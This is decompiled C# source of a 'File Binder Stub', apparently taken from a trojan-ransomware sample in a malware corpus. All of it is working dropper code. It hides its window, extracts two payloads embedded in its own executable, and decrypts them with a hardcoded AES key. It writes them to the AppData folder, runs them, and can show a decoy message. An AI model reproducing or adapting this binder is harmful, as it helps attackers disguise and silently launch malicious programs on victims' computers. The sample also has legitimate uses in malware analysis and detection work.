// Decompiled with JetBrains decompiler
// Type: File_Binder_Stub.frmMain
// Assembly: File Binder Stub, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: D15418F3-D3A0-4722-93D3-5C2D5CCC192C
// Assembly location: C:\Users\Administrateur\Desktop\Virusshare-00005-msil\Trojan-Ransom.Win32.Blocker.kodm-8fe77f82030024ee7b3eeb7afd6ecd2761452f4138a0f403854e9adbc1c689d3.exe

using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Security.Cryptography;
using System.Windows.Forms;

namespace File_Binder_Stub
{
  public class frmMain : Form
  {
    private IContainer components;
    private string f;
    private string f2;

    protected override void Dispose(bool disposing)
    {
      if (disposing && this.components != null)
        this.components.Dispose();
      base.Dispose(disposing);
    }

    private void InitializeComponent()
    {
      this.SuspendLayout();
      this.AutoScaleDimensions = new SizeF(6f, 13f);
      this.AutoScaleMode = AutoScaleMode.Font;
      this.ClientSize = new Size(34, 23);
      this.FormBorderStyle = FormBorderStyle.None;
      this.MaximizeBox = false;
      this.MinimizeBox = false;
      this.Name = "Form1";
      this.ShowIcon = false;
      this.ShowInTaskbar = false;
      this.StartPosition = FormStartPosition.CenterScreen;
      this.TransparencyKey = SystemColors.Control;
      this.WindowState = FormWindowState.Minimized;
      this.Load += new EventHandler(this.Form1_Load);
      this.ResumeLayout(false);
    }

    public frmMain() => this.InitializeComponent();

    private static byte[] UnSecure(byte[] data)
    {
      RijndaelManaged rijndaelManaged = new RijndaelManaged();
      byte[] numArray1 = new byte[16]
      {
        (byte) 1,
        (byte) 2,
        (byte) 3,
        (byte) 4,
        (byte) 5,
        (byte) 6,
        (byte) 7,
        (byte) 8,
        (byte) 9,
        (byte) 1,
        (byte) 2,
        (byte) 3,
        (byte) 4,
        (byte) 5,
        (byte) 6,
        (byte) 7
      };
      byte[] numArray2 = new byte[16]
      {
        (byte) 7,
        (byte) 6,
        (byte) 5,
        (byte) 4,
        (byte) 3,
        (byte) 2,
        (byte) 1,
        (byte) 9,
        (byte) 8,
        (byte) 7,
        (byte) 6,
        (byte) 5,
        (byte) 4,
        (byte) 3,
        (byte) 2,
        (byte) 1
      };
      rijndaelManaged.IV = numArray1;
      rijndaelManaged.Key = numArray2;
      return rijndaelManaged.CreateDecryptor().TransformFinalBlock(data, 0, data.Length);
    }

    private void Form1_Load(object sender, EventArgs e)
    {
      try
      {
        string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
        string[] strArray = File.ReadAllText(Application.ExecutablePath).Split(new string[1]
        {
          "[COITUSINTERRUPTUS555]"
        }, StringSplitOptions.None);
        byte[] bytes1 = frmMain.UnSecure(Convert.FromBase64String(strArray[1]));
        byte[] bytes2 = frmMain.UnSecure(Convert.FromBase64String(strArray[3]));
        File.WriteAllBytes(folderPath + "\\" + strArray[2], bytes1);
        File.WriteAllBytes(folderPath + "\\" + strArray[4], bytes2);
        Process.Start(folderPath + "\\" + strArray[2]);
        Process.Start(folderPath + "\\" + strArray[4]);
        string str = strArray[5];
        string text = strArray[6];
        string caption = strArray[7];
        if (str == "Y")
        {
          int num = (int) MessageBox.Show(text, caption, MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
        }
      }
      catch
      {
      }
      Application.Exit();
    }
  }
}
